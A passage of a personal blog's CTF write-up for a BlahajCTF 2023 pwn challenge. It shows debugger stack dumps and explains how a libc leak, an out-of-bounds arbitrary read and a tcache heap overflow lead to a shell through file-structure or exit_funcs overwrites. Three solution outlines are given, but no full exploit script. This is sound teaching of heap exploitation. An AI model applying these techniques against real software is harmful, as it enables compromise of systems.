</span></span><span class=line><span class=cl><span class=nt>03</span><span class=p>:</span><span class=nd>0018</span><span class=err>│</span>         <span class=nt>0x7fffffffde48</span> <span class=err>◂—</span> <span class=nt>0x20</span> <span class=c>/* size */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                 <span class=c>/* start of wishlist */</span>
</span></span><span class=line><span class=cl><span class=nt>04</span><span class=p>:</span><span class=nd>0020</span><span class=err>│</span>         <span class=nt>0x7fffffffde50</span> <span class=err>—▸</span> <span class=nt>0x5555555592a0</span> <span class=err>◂—</span> <span class=s1>&#39;chunk 0\n&#39;</span>
</span></span><span class=line><span class=cl><span class=nt>05</span><span class=p>:</span><span class=nd>0028</span><span class=err>│</span>         <span class=nt>0x7fffffffde58</span> <span class=err>—▸</span> <span class=nt>0x5555555592d0</span> <span class=err>◂—</span> <span class=s1>&#39;chunk 1\n&#39;</span>
</span></span><span class=line><span class=cl><span class=nt>06</span><span class=p>:</span><span class=nd>0030</span><span class=err>│</span>         <span class=nt>0x7fffffffde60</span> <span class=err>◂—</span> <span class=nt>0x0</span>
</span></span><span class=line><span class=cl><span class=o>...</span> <span class=err>↓</span>            <span class=nt>7</span> <span class=nt>skipped</span>
</span></span><span class=line><span class=cl>                 <span class=c>/* end of wishlist */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                 <span class=c>/* start of buf */</span>
</span></span><span class=line><span class=cl><span class=nt>0e</span><span class=p>:</span><span class=nd>0070</span><span class=err>│</span> <span class=nt>rax</span> <span class=nt>rdi</span> <span class=nt>0x7fffffffdea0</span> <span class=err>◂—</span> <span class=nt>0xa32</span> <span class=c>/* &#39;2\n&#39; */</span>
</span></span><span class=line><span class=cl><span class=nt>0f</span><span class=p>:</span><span class=nd>0078</span><span class=err>│</span>         <span class=nt>0x7fffffffdea8</span> <span class=err>◂—</span> <span class=nt>0x0</span>
</span></span><span class=line><span class=cl><span class=o>...</span> <span class=err>↓</span>            <span class=nt>2</span> <span class=nt>skipped</span>
</span></span><span class=line><span class=cl><span class=nt>12</span><span class=p>:</span><span class=nd>0090</span><span class=err>│</span>         <span class=nt>0x7fffffffdec0</span> <span class=err>◂—</span> <span class=nt>0x1</span>
</span></span><span class=line><span class=cl><span class=nt>13</span><span class=p>:</span><span class=nd>0098</span><span class=err>│</span>         <span class=nt>0x7fffffffdec8</span> <span class=err>◂—</span> <span class=nt>0x1</span>
</span></span><span class=line><span class=cl><span class=nt>14</span><span class=p>:</span><span class=nd>00a0</span><span class=err>│</span>         <span class=nt>0x7fffffffded0</span> <span class=err>—▸</span> <span class=nt>0x555555554040</span> <span class=err>◂—</span> <span class=nt>0x400000006</span>
</span></span><span class=line><span class=cl><span class=nt>15</span><span class=p>:</span><span class=nd>00a8</span><span class=err>│</span>         <span class=nt>0x7fffffffded8</span> <span class=err>—▸</span> <span class=nt>0x7ffff7fe283c</span> <span class=o>(</span><span class=nt>_dl_sysdep_start</span><span class=o>+</span><span class=nt>1020</span><span class=o>)</span> <span class=err>◂—</span> <span class=nt>mov</span> <span class=nt>rax</span><span class=o>,</span> <span class=nt>qword</span> <span class=nt>ptr</span> <span class=o>[</span><span class=nt>rsp</span> <span class=o>+</span> <span class=nt>0x58</span><span class=o>]</span>
</span></span><span class=line><span class=cl><span class=nt>16</span><span class=p>:</span><span class=nd>00b0</span><span class=err>│</span>         <span class=nt>0x7fffffffdee0</span> <span class=err>◂—</span> <span class=nt>0x6f0</span>
</span></span><span class=line><span class=cl><span class=nt>17</span><span class=p>:</span><span class=nd>00b8</span><span class=err>│</span>         <span class=nt>0x7fffffffdee8</span> <span class=err>—▸</span> <span class=nt>0x7fffffffe2e9</span> <span class=err>◂—</span> <span class=nt>0x3d04659de82d9f62</span>
</span></span><span class=line><span class=cl><span class=nt>18</span><span class=p>:</span><span class=nd>00c0</span><span class=err>│</span>         <span class=nt>0x7fffffffdef0</span> <span class=err>—▸</span> <span class=nt>0x7ffff7fc1000</span> <span class=err>◂—</span> <span class=nt>jg</span> <span class=nt>0x7ffff7fc1047</span>
</span></span><span class=line><span class=cl><span class=nt>19</span><span class=p>:</span><span class=nd>00c8</span><span class=err>│</span>         <span class=nt>0x7fffffffdef8</span> <span class=err>◂—</span> <span class=nt>0x10101000000</span>
</span></span><span class=line><span class=cl><span class=nt>1a</span><span class=p>:</span><span class=nd>00d0</span><span class=err>│</span>         <span class=nt>0x7fffffffdf00</span> <span class=err>◂—</span> <span class=nt>0x2</span>
</span></span><span class=line><span class=cl><span class=nt>1b</span><span class=p>:</span><span class=nd>00d8</span><span class=err>│</span>         <span class=nt>0x7fffffffdf08</span> <span class=err>◂—</span> <span class=nt>0x78bfbff</span>
</span></span><span class=line><span class=cl><span class=nt>1c</span><span class=p>:</span><span class=nd>00e0</span><span class=err>│</span>         <span class=nt>0x7fffffffdf10</span> <span class=err>—▸</span> <span class=nt>0x7fffffffe2f9</span> <span class=err>◂—</span> <span class=nt>0x34365f363878</span> <span class=c>/* &#39;x86_64&#39; */</span>
</span></span><span class=line><span class=cl><span class=nt>1d</span><span class=p>:</span><span class=nd>00e8</span><span class=err>│</span>         <span class=nt>0x7fffffffdf18</span> <span class=err>◂—</span> <span class=nt>0x64</span> <span class=c>/* &#39;d&#39; */</span>
</span></span><span class=line><span class=cl><span class=nt>1e</span><span class=p>:</span><span class=nd>00f0</span><span class=err>│</span>         <span class=nt>0x7fffffffdf20</span> <span class=err>◂—</span> <span class=nt>0x1000</span>
</span></span><span class=line><span class=cl><span class=nt>1f</span><span class=p>:</span><span class=nd>00f8</span><span class=err>│</span>         <span class=nt>0x7fffffffdf28</span> <span class=err>◂—</span> <span class=nt>0x3d04659de82d9f00</span>
</span></span><span class=line><span class=cl><span class=nt>20</span><span class=p>:</span><span class=nd>0100</span><span class=err>│</span> <span class=nt>rbp</span>     <span class=nt>0x7fffffffdf30</span> <span class=err>◂—</span> <span class=nt>0x1</span>
</span></span><span class=line><span class=cl><span class=nt>21</span><span class=p>:</span><span class=nd>0108</span><span class=err>│</span>         <span class=nt>0x7fffffffdf38</span> <span class=err>—▸</span> <span class=nt>0x7ffff7dabd90</span> <span class=o>(</span><span class=nt>__libc_start_call_main</span><span class=o>+</span><span class=nt>128</span><span class=o>)</span> <span class=err>◂—</span> <span class=nt>mov</span> <span class=nt>edi</span><span class=o>,</span> <span class=nt>eax</span>
</span></span><span class=line><span class=cl>                 <span class=c>/* end of main function&#39;s stack frame */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>22</span><span class=p>:</span><span class=nd>0110</span><span class=err>│</span>         <span class=nt>0x7fffffffdf40</span> <span class=err>◂—</span> <span class=nt>0x0</span>
</span></span><span class=line><span class=cl><span class=nt>23</span><span class=p>:</span><span class=nd>0118</span><span class=err>│</span>         <span class=nt>0x7fffffffdf48</span> <span class=err>—▸</span> <span class=nt>0x555555555398</span> <span class=o>(</span><span class=nt>main</span><span class=o>)</span> <span class=err>◂—</span> <span class=nt>endbr64</span>
</span></span><span class=line><span class=cl><span class=nt>24</span><span class=p>:</span><span class=nd>0120</span><span class=err>│</span>         <span class=nt>0x7fffffffdf50</span> <span class=err>◂—</span> <span class=nt>0x1ffffe030</span>
</span></span><span class=line><span class=cl><span class=nt>25</span><span class=p>:</span><span class=nd>0128</span><span class=err>│</span>         <span class=nt>0x7fffffffdf58</span> <span class=err>—▸</span> <span class=nt>0x7fffffffe048</span> <span class=err>—▸</span> <span class=nt>0x7fffffffe308</span> <span class=err>◂—</span> <span class=s1>&#39;/home/elmo/caprinux-github-io/content/en/posts/ctfs/2023/blahaj-ctf/attachments/pwn/christmas/santa&#39;</span>
</span></span><span class=line><span class=cl><span class=nt>26</span><span class=p>:</span><span class=nd>0130</span><span class=err>│</span>         <span class=nt>0x7fffffffdf60</span> <span class=err>◂—</span> <span class=nt>0x0</span>
</span></span><span class=line><span class=cl><span class=nt>27</span><span class=p>:</span><span class=nd>0138</span><span class=err>│</span>         <span class=nt>0x7fffffffdf68</span> <span class=err>◂—</span> <span class=nt>0xeaa1cb2c566b5502</span>
</span></span><span class=line><span class=cl><span class=nt>28</span><span class=p>:</span><span class=nd>0140</span><span class=err>│</span>         <span class=nt>0x7fffffffdf70</span> <span class=err>—▸</span> <span class=nt>0x7fffffffe048</span> <span class=err>—▸</span> <span class=nt>0x7fffffffe308</span> <span class=err>◂—</span> <span class=s1>&#39;/home/elmo/caprinux-github-io/content/en/posts/ctfs/2023/blahaj-ctf/attachments/pwn/christmas/santa&#39;</span>
</span></span><span class=line><span class=cl><span class=nt>29</span><span class=p>:</span><span class=nd>0148</span><span class=err>│</span>         <span class=nt>0x7fffffffdf78</span> <span class=err>—▸</span> <span class=nt>0x555555555398</span> <span class=o>(</span><span class=nt>main</span><span class=o>)</span> <span class=err>◂—</span> <span class=nt>endbr64</span>
</span></span><span class=line><span class=cl><span class=nt>2a</span><span class=p>:</span><span class=nd>0150</span><span class=err>│</span>         <span class=nt>0x7fffffffdf80</span> <span class=err>—▸</span> <span class=nt>0x555555557d80</span> <span class=o>(</span><span class=nt>__do_global_dtors_aux_fini_array_entry</span><span class=o>)</span> <span class=err>—▸</span> <span class=nt>0x555555555200</span> <span class=o>(</span><span class=nt>__do_global_dtors_aux</span><span class=o>)</span> <span class=err>◂—</span> <span class=nt>endbr64</span>
</span></span><span class=line><span class=cl><span class=nt>2b</span><span class=p>:</span><span class=nd>0158</span><span class=err>│</span>         <span class=nt>0x7fffffffdf88</span> <span class=err>—▸</span> <span class=nt>0x7ffff7ffd040</span> <span class=o>(</span><span class=nt>_rtld_global</span><span class=o>)</span> <span class=err>—▸</span> <span class=nt>0x7ffff7ffe2e0</span> <span class=err>—▸</span> <span class=nt>0x555555554000</span> <span class=err>◂—</span> <span class=nt>0x10102464c457f</span>
</span></span><span class=line><span class=cl><span class=nt>2c</span><span class=p>:</span><span class=nd>0160</span><span class=err>│</span>         <span class=nt>0x7fffffffdf90</span> <span class=err>◂—</span> <span class=nt>0x155e34d3e8e95502</span>
</span></span><span class=line><span class=cl><span class=nt>2d</span><span class=p>:</span><span class=nd>0168</span><span class=err>│</span>         <span class=nt>0x7fffffffdf98</span> <span class=err>◂—</span> <span class=nt>0x155e24992ce15502</span>
</span></span><span class=line><span class=cl><span class=nt>2e</span><span class=p>:</span><span class=nd>0170</span><span class=err>│</span>         <span class=nt>0x7fffffffdfa0</span> <span class=err>◂—</span> <span class=nt>0x7fff00000000</span>
</span></span><span class=line><span class=cl><span class=nt>2f</span><span class=p>:</span><span class=nd>0178</span><span class=err>│</span>         <span class=nt>0x7fffffffdfa8</span> <span class=err>◂—</span> <span class=nt>0x0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nt>pwndbg</span><span class=o>&gt;</span> <span class=nt>vmmap</span> <span class=nt>0x7ffff7ffe2e0</span>
</span></span><span class=line><span class=cl><span class=nt>LEGEND</span><span class=o>:</span> <span class=nt>STACK</span> <span class=o>|</span> <span class=nt>HEAP</span> <span class=o>|</span> <span class=nt>CODE</span> <span class=o>|</span> <span class=nt>DATA</span> <span class=o>|</span> <span class=nt>RWX</span> <span class=o>|</span> <span class=nt>RODATA</span>
</span></span><span class=line><span class=cl>             <span class=nt>Start</span>                <span class=nt>End</span> <span class=nt>Perm</span>     <span class=nt>Size</span> <span class=nt>Offset</span> <span class=nt>File</span>
</span></span><span class=line><span class=cl>    <span class=nt>0x7ffff7ffb000</span>     <span class=nt>0x7ffff7ffd000</span> <span class=nt>r--p</span>     <span class=nt>2000</span>  <span class=nt>37000</span> <span class=o>/</span><span class=nt>usr</span><span class=o>/</span><span class=nt>lib</span><span class=o>/</span><span class=nt>x86_64-linux-gnu</span><span class=o>/</span><span class=nt>ld-linux-x86-64</span><span class=p>.</span><span class=nc>so</span><span class=p>.</span><span class=nc>2</span>
</span></span><span class=line><span class=cl><span class=err>►</span>   <span class=nt>0x7ffff7ffd000</span>     <span class=nt>0x7ffff7fff000</span> <span class=nt>rw-p</span>     <span class=nt>2000</span>  <span class=nt>39000</span> <span class=o>/</span><span class=nt>usr</span><span class=o>/</span><span class=nt>lib</span><span class=o>/</span><span class=nt>x86_64-linux-gnu</span><span class=o>/</span><span class=nt>ld-linux-x86-64</span><span class=p>.</span><span class=nc>so</span><span class=p>.</span><span class=nc>2</span> <span class=o>+</span><span class=nt>0x12e0</span>
</span></span><span class=line><span class=cl>    <span class=nt>0x7ffffffde000</span>     <span class=nt>0x7ffffffff000</span> <span class=nt>rw-p</span>    <span class=nt>21000</span>      <span class=nt>0</span> <span class=o>[</span><span class=nt>stack</span><span class=o>]</span>
</span></span></code></pre></div><p>One of the most important things that we want to leak is the LIBC address, as it will contain the necessary functions that we need in order to pop a shell on remote. At offset <code>2b:0158</code> on the stack, we can see that there is a <code>_rtld_global</code> pointer that contains an address within the <code>ld.so</code> memory space as seen above. How is an address within <code>ld.so</code> going to help us? If we actually look at the memory mapping diagram below</p><pre tabindex=0><code>┌────────────────────┐
│                    │
│        santa       │
│       binary       │
│                    │
├────────────────────┤
│                    │
│                    │
├────────────────────┤
│                    │
│                    │
│       HEAP         │
│                    │
├────────────────────┤
│                    │
│                    │
├────────────────────┤
│                    │
│                    │
│      LIBC.SO       │
│                    │
├────────────────────┤
│                    │
│                    │
│       LD.SO        │
│                    │
├────────────────────┤
│                    │
│                    │
│                    │
├────────────────────┤
│                    │
│                    │
│      STACK         │
│                    │
│                    │
└────────────────────┘
</code></pre><p>We can see the different parts that make up a program&rsquo;s memory. Despite the ASLR, the <strong>libc</strong> and <strong>ld</strong> are directly next to each other in memory and thus there will be a fixed offset between LD and LIBC in memory. By leaking a LD pointer, we can calculate the offset to get our <strong>libc</strong> base address and move on to later parts of the exploit.</p><p>The offset of wishlist as shown above is <code>rsp+0x20</code> and the ld pointer is at <code>rsp+0x158</code>. Thus, we can view a wish at the index of <code>(0x158-0x28)/0x8 = 38</code> to get our libc address leak. <strong>Now that we know how to leak the LIBC, can we go one step further to get an arbitrary read to read at any address that we want?</strong></p><p>Remember that in order to read at an address, that same address has to be on the stack at a positive index from the wishlist array. If we look at the stack, <strong>right after the wishlist array lies the <code>buf</code> array</strong> which contains our input when the program takes in our choice. This means that we can place addresses that we want to read from into <code>buf</code>, and then use a large positive index to treat the address as a wish and read from it.</p><p>With this, we have an extremely powerful arbitrary read primitive which allows us to read anywhere that we want in the memory as long as we know the address of the values that we want to read.</p><h4 id=arbitrary-write-heap-overflow>Arbitrary Write: Heap Overflow</h4><p>Although the OOB access on the wishlist array is sufficient to solve the challenge <em>(in the intended way)</em>, to make our lives even easier and for the sake of learning, let&rsquo;s explore how a heap overflow is of any use to us.</p><p>Let&rsquo;s look at the state of the heap when we add 3 wishes to the wishlist array. This is straightforward, I have allocated 3 chunks on the heap and each of the chunk has a size of <strong>0x30</strong>.</p><p><img src=./attachments/pwn/christmas/heap1.png alt=image></p><p>Now, we will free these chunks and see what happens. As we can see from the image below, the 3 chunks has been placed in the <strong>tcachebin</strong>, and is stored in a linked list where each freed chunk contains an <strong>encoded</strong> pointer to the next freed chunk.</p><p>We can also note that there is a 8-byte tcache key that is circled in red. This key acts like a <strong>stack canary to prevent heap overflow or use after free</strong> &ndash; the program will check if the key has been modified and terminate.</p><blockquote><p>The <strong>tcachebin</strong> is simply a series of linked lists of heap chunks of the same size that has been free-ed. The main purpose is for efficiency, to allow the allocator to quickly return these chunks when required by the program instead of releasing it back to the top chunk.</p></blockquote><blockquote><p>The linked list pointers are encoded with a new safety mechanism known as tcache safe-linking that is introduced in recent version of the GLIBC. Essentially, the linked list pointer is encoded by <strong>XOR</strong>ing the pointer with the address where the pointer resides in, shifted to the right by 12 bits.</p><p>ENCODED_POINTER = LINKED_LIST_POINTER ^ (ADDRESS_OF_POINTER &#187; 12)</p><p>This is not a big issue to us as we can easily encode/decode the pointer as long as we are able to leak a heap address.</p></blockquote><p><img src=./attachments/pwn/christmas/heap2.png alt=image></p><p>If we are able to safely overwrite the linked list pointer on the freed chunk, we might be able to trick the dynamic allocator to return us a heap chunk to anywhere that we like. This will give us an arbitrary write primitive.</p><h4 id=what-next>What next?</h4><p>Now that we know how to get both our <strong>arbitrary read</strong> and <strong>arbitrary write</strong> primitives, what and where can we write to? There are a few easy and known methods that we can use to get a shell</p><ol><li>ROP on the stack<ul><li>leak a stack address</li><li>arbitrary write onto the stack to write a rop chain that will be executed on return</li><li><strong>will not work here, since the program NEVER returns</strong></li></ul></li><li><a href=https://m101.github.io/binholic/2017/05/20/notes-on-abusing-exit-handlers.html>Overwriting exit_funcs</a><ul><li>leak/overwrite <code>pointer_guard</code></li><li>write system and binsh string to __exit_funcs</li></ul></li><li><a href=https://chovid99.github.io/posts/file-structure-attack-part-1/>File Structure Exploitation</a><ul><li>abusing file structure and vtables to pop a shell</li><li>this is sortof like a one-gadget kind of exploit</li></ul></li></ol><p>We have all that we need to solve the challenge. In the spirit of learning, let&rsquo;s try to solve this in 3 different ways and explore the different technicalities that comes with heap exploitation. This will also show us how each primitive is sufficiently powerful to solve the challenge.</p><h3 id=solution-1-most-straightforward-solution-using-everything-mentioned-so-far>SOLUTION 1: Most Straightforward Solution, using everything mentioned so far</h3><h4 id=summary>Summary</h4><ol><li>Add wish at negative index to overwrite <code>limit</code></li><li>After overwriting limit, leak a bunch of addresses that will be useful for us<ul><li>libc address</li><li>heap address</li></ul></li><li>Given libc address, sufficient to craft our malicious File Structure</li><li>Overwrite tcache chunk metadata to get arbitrary write to <code>_IO_2_1_stderr_</code></li><li>Exit the program to trigger our file structure exploit chain and get a shell</li></ol><h3 id=solution-2-solve-without-using-the-heap-overflow-intended-solution>SOLUTION 2: Solve without using the heap overflow [intended solution]</h3><h4 id=summary-1>Summary</h4><ol><li>Add wish at negative index to overwrite <code>limit</code></li><li>After overwriting limit, leak a bunch of addresses that will be useful for us<ul><li>libc address</li><li>heap address</li><li>pointer guard</li></ul></li><li>By putting heap addresses in <code>buf</code>, we can achieve Use After free (UAF).<ul><li>we can do a fastbin dup to get arbitrary write</li></ul></li><li>Overwrite exit_funcs to call system(binsh) on exit</li></ol><h3 id=solution-3-solve-without-overwriting-limit>SOLUTION 3: Solve without overwriting limit</h3><h4 id=summary-2>Summary</h4><ol><li>Leak heap and libc address by doing fgets with size 0 to reclaim memory that has been freed but not cleared.</li><li>Similar to solution 1, do tcache unlinking to overwrite <code>_IO_2_1_stderr_</code></li><li>Exit the program to trigger file structure exploit chain and get a shell</li></ol></div></article><hr style=margin-top:40px;margin-bottom:40px><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//caprinux.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></main></div><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://github.com/caprinux target=_blank rel="noopener noreferrer me" title=Github><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a><a href=https://x.com/elma_ios target=_blank rel="noopener noreferrer me" title=Twitter><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></a><a href=index.xml target=_blank rel="noopener noreferrer me" title=Rss><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></div><small class=footer_copyright>© 2023 elma.
Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel=noopener>Hugo blog awesome</a>.</small></footer><a href=# title="Go to top" id=totop><svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentcolor" stroke="currentcolor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"/></svg></a><script src=https://blog.caprinux.com/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30+lSNuSkl4QXuNyy8="></script></body></html>